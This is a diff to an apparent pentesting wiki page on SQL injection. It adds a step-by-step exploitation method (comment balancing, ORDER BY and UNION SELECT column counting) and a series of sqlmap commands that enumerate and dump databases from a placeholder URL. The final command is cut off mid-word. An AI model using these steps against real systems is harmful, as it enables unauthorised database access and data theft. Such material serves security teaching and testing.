@@ -26,6 +26,20 @@ To do so you should try to **create a new object named as the "master object"** 
 
     If the database is vulnerable and the max number of chars for a username is 30 and you want to impersonate the user **admin**, try to create a username called: "_admin \[30 spaces] a_" and any password.
 
+
+
+## How to Exploit it ?&#x20;
+
+1. **Find the injection Point.**
+2. **Fix Quary or Balance SQLI**
+   1. **in GET we add '--+**
+   2. **in POST we add '--**<mark style="color:red;">**SPACE**</mark>** or '**<mark style="color:red;">**#**</mark>
+3. **Find the total number of vuln Columns**&#x20;
+   1. **Order by **<mark style="color:orange;">**n**</mark>
+   2. **UNION select 1,2,3,4,**<mark style="color:red;">**n-1**</mark>** => look Different number of Columns**
+   3. **WHERE OR HAVING**
+   4. **version() to test**&#x20;
+
 ## How to perform a Query
 
 ```sql
@@ -287,6 +301,38 @@ sqlmap -r req.txt --dbs --random-agent --risk 3 --level 5 -p username,password
 **`-p`** TESTPARAMETER  Testable parameter(s)
 
 
+
+Assuming you've tested a parameter with `'` and it is injectable, run SQL map against the URL:
+
+```sql
+sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dbms=mysql
+```
+
+It may not run unless you specify the database type.
+
+Get the databases:
+
+```sql
+sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dbs --dbms=mysql
+```
+
+Get the tables in a database:
+
+```sql
+sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --tables -D [database name]
+```
+
+Get the columns in a table:
+
+```sql
+sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --columns -D [database name] -T [table name]
+```
+
+Dump a table:
+
+```sql
+sqlmap -u "http://[host]/inject.php?param1=1&param2=whatever" --dump -D [database name] -T [tabl
+```
 
 ### Confirming with Timing <a href="#confirming-with-timing" id="confirming-with-timing"></a>
 
